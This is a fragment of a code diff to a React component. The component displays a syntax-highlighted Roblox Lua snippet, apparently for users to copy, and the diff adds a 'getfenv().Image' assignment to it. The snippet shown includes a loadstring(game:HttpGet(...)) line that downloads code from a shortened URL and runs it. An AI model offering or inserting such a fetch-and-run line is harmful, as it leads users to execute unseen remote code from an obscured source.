@@ -102,6 +102,13 @@ loadstring(game:HttpGet'https://tinyurl.com/3fmxt65b')()':3'`;
                 </div>
                 <pre className="flex-1 overflow-x-auto">
                   <code className="text-sm font-mono leading-relaxed whitespace-pre block">
+                    <span className="text-yellow-400">getfenv</span>
+                    <span className="text-slate-400">(</span>
+                    <span className="text-cyan-300">)</span>
+                    <span className="text-slate-400">.</span>
+                    <span className="text-yellow-400">Image</span>
+                    <span className="text-green-400">=</span>
+                    <span className="text-slate-400">""</span>
                     <span className="text-yellow-400">loadstring</span>
                     <span className="text-slate-400">(</span>
                     <span className="text-cyan-300">game</span>
